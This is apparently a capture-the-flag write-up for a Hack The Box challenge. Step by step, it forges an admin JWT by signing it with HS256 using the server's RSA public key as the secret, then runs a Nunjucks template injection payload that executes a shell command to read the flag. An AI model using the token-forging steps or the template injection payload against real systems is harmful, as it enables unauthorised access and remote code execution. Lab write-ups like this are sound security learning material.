**Vulnerable JWT token -> SSTI**

![image](https://user-images.githubusercontent.com/87831546/145028487-db0efb63-43ec-46ca-af4a-c38edd9f4087.png)

Create user (can't create admin as admin is already registered)
![image](https://user-images.githubusercontent.com/87831546/144931705-617e5201-89ed-498e-bf21-8fdbec7136d3.png)

We get access denied and a sus cookie
![image](https://user-images.githubusercontent.com/87831546/144931784-55080963-122b-4724-8bee-ce5c07407022.png)

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJvYiIsInBrIjoiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBb29lSlNrS0xvQlQ5Z2p4L2J3RDZcbjFwRHhOdnV0OE94Zzg1cWxjakVGV1EwQ0VWTlo2em5TWkI0ZzQ2Z1FYNy93ZlJJVzYyUjV4dGNqZlp6dEIzYTBcbi9IUHZMeW1RS25vbDVORldmNkZ2QkxOazhvWTE5ZVVEdndsbXNCM3JITWZZR2V6c2ZiVWlhWitIcWg5L3kzdUNcbnhjUW1NcW9XT3BsejZwMFVOUkN1bnFsTUVyNmd4M1J2UDRjNm02empVTnU0QlVTR0dock9HNGpBOEFCQURtTE9cbjd5ZmVhZVhkK3JOVWR3YlJ1T2pUMnVib2NuZjNhL09rcUdCYzN1cHVraEt4Nm5SazdsRGNpbFdJOHR4M3lPbmFcbktONC8wci9XQWNtRUZGcTZuR1d6azhXYng3Y3M1b3p4RnZhOW1MVUdTRHVYVW92RWprM3M5SnZWbFY1WjRPMk9cbmNRSURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0iLCJpYXQiOjE2Mzg4MjkxNDJ9.L8LSDVAmTchMdHZ5WWDZ27PLcryv-zbcnbkqCXGW0vT1WfqfpzzpVo-sOI6zHbazNDOeffdKwN_sJICZfAutPfRFpgDxSHayzkxQL3FOcHsSm6XSKBQKodPAYj773PCDkhX5h4KncxNdIo8vTfkzhcw9PADiOr6oA2i_Ue2jgy1qOLTN9k2zjJKIXuvVo1n9ToMwUCp1GSrMXJIClJ7IMHmEb_OY6VBNZhjWXZsNZGEoze_dB-TLVas7Qtx2D4oJPSK2sp0hyKzYDGS6I1Gp9bI3xnzEjiwJ9tEm9F07Icc2CfaTT87fW6EIIpHmAZRKXTSt4xcGf61qRBY1fZatJw
```

![image](https://user-images.githubusercontent.com/87831546/144932118-5c953c30-7676-4b2d-bbe8-21bb82c8f48d.png)


The source code tells us the token can also be verified with HS256 algorithm which allows us to try a Confusion Attack.

![image](https://user-images.githubusercontent.com/87831546/144930700-5270a1fa-d76b-4be2-b6d7-391cf8999a4d.png)

Follow this guide: https://habr.com/en/post/450054/ 

1) Change alg to HS256 and username to admin
2) Copy the public key from data and make it into proper format
 ```
└─$ echo -n "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAjMrFKjltNIt9UZgzo+d9\nIOWL6pamk+5Ve7z8uDPnquJdw8FPtFeolxC8C/BPcSq6FFbbGtq6gjfmv/G5kuvx\na0i9rt5EGYJfuv+k8IJ0er4T8/QEHrgcQG5qot70c3vzcPlmoN9OtPwSm4yJAPme\nlFY2i/1YrUbNP4JN0/Bpaz25ngLbtgV+fUoJzoeXwdvHEkzj1zB924/eCtWwoOiO\nCptC1pWqTSier3H6oUTFKOVDz25ENG/AGZWlWbh2crSEMeHq/ML8t5OnLK3R7ima\nXbusu+ETewdElZGLHIdAZPM3a7rR5zJz9VFa5rZcJOqa05TSv3FWQRBYS8r5wtl4\nWwIDAQAB\n-----END PUBLIC KEY-----" > public.pem
```

![image](https://user-images.githubusercontent.com/87831546/145026142-f9515b37-32fe-4e3c-a640-9771c7c4b3a0.png)

3) Turn into ASCII hex:
```
cat public.pem | xxd -p | tr -d "\\n"
```

![image](https://user-images.githubusercontent.com/87831546/145026316-90ecb6a3-4995-4c59-b606-7dc47ff5251c.png)

4) Copied the first two parts of the JWT (header and payload) and then supply our public key to sign it
```
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFqTXJGS2psdE5JdDlVWmd6bytkOVxuSU9XTDZwYW1rKzVWZTd6OHVEUG5xdUpkdzhGUHRGZW9seEM4Qy9CUGNTcTZGRmJiR3RxNmdqZm12L0c1a3V2eFxuYTBpOXJ0NUVHWUpmdXYrazhJSjBlcjRUOC9RRUhyZ2NRRzVxb3Q3MGMzdnpjUGxtb045T3RQd1NtNHlKQVBtZVxubEZZMmkvMVlyVWJOUDRKTjAvQnBhejI1bmdMYnRnVitmVW9Kem9lWHdkdkhFa3pqMXpCOTI0L2VDdFd3b09pT1xuQ3B0QzFwV3FUU2llcjNINm9VVEZLT1ZEejI1RU5HL0FHWldsV2JoMmNyU0VNZUhxL01MOHQ1T25MSzNSN2ltYVxuWGJ1c3UrRVRld2RFbFpHTEhJZEFaUE0zYTdyUjV6Sno5VkZhNXJaY0pPcWEwNVRTdjNGV1FSQllTOHI1d3RsNFxuV3dJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSIsImlhdCI6MTYzODg3ODQ2Mn0" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b43415145416a4d72464b6a6c744e497439555a677a6f2b64390a494f574c3670616d6b2b355665377a387544506e71754a64773846507446656f6c784338432f4250635371364646626247747136676a666d762f47356b7576780a613069397274354547594a6675762b6b38494a3065723454382f514548726763514735716f7437306333767a63506c6d6f4e394f745077536d34794a41506d650a6c465932692f31597255624e50344a4e302f4270617a32356e674c627467562b66556f4a7a6f655877647648456b7a6a317a423932342f65437457776f4f694f0a437074433170577154536965723348366f5554464b4f56447a3235454e472f41475a576c57626832637253454d6548712f4d4c3874354f6e4c4b335237696d610a58627573752b4554657764456c5a474c484964415a504d3361377252357a4a7a3956466135725a634a4f71613035545376334657515242595338723577746c340a57774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d
```

![image](https://user-images.githubusercontent.com/87831546/145026786-5b7118f2-876c-4ac7-b79e-ada9480b66be.png)

5) One-liner to turn this ASCII hex signature into the JWT format is
```
python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('573dd7e9dca7fee66cf10f345af336fbd4b2f0b0816a2dc7011b5f97e1383483')).replace('=','')\")"
```

![image](https://user-images.githubusercontent.com/87831546/145027174-52428c49-eb45-46b2-aaf8-597c4ff6a93b.png)

6) Append to end of jwt token to create our finished token

Final token:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFqTXJGS2psdE5JdDlVWmd6bytkOVxuSU9XTDZwYW1rKzVWZTd6OHVEUG5xdUpkdzhGUHRGZW9seEM4Qy9CUGNTcTZGRmJiR3RxNmdqZm12L0c1a3V2eFxuYTBpOXJ0NUVHWUpmdXYrazhJSjBlcjRUOC9RRUhyZ2NRRzVxb3Q3MGMzdnpjUGxtb045T3RQd1NtNHlKQVBtZVxubEZZMmkvMVlyVWJOUDRKTjAvQnBhejI1bmdMYnRnVitmVW9Kem9lWHdkdkhFa3pqMXpCOTI0L2VDdFd3b09pT1xuQ3B0QzFwV3FUU2llcjNINm9VVEZLT1ZEejI1RU5HL0FHWldsV2JoMmNyU0VNZUhxL01MOHQ1T25MSzNSN2ltYVxuWGJ1c3UrRVRld2RFbFpHTEhJZEFaUE0zYTdyUjV6Sno5VkZhNXJaY0pPcWEwNVRTdjNGV1FSQllTOHI1d3RsNFxuV3dJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSIsImlhdCI6MTYzODg3ODQ2Mn0.Vz3X6dyn_uZs8Q80WvM2-9Sy8LCBai3HARtfl-E4NIM
```

Replace in browser and we can access this new page

![image](https://user-images.githubusercontent.com/87831546/145027447-c0d02f7f-8ec8-4ac8-8881-b4a3bd871438.png)

Nunchucks templating being used
![image](https://user-images.githubusercontent.com/87831546/145027912-f473e88e-3103-4ef0-93bb-7d121d03e25f.png)

Vulnerable to SSTI:

![image](https://user-images.githubusercontent.com/87831546/145027942-54ce03ea-7e3e-4c35-8fa4-3f2c8dc90fd2.png)

Reflected here

![image](https://user-images.githubusercontent.com/87831546/145028013-1d6dae6e-00b2-45ac-8f2c-48404cf67a16.png)

Nunchucks SSTI: http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine 

```
{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag.txt')")()}}
```

![image](https://user-images.githubusercontent.com/87831546/145028412-a4b6079c-ab59-4e43-bd4c-7015fec54fe0.png)


```
HTB{S4nt4_g0t_ninety9_pr0bl3ms_but_chr1stm4s_4in7_0n3}
```
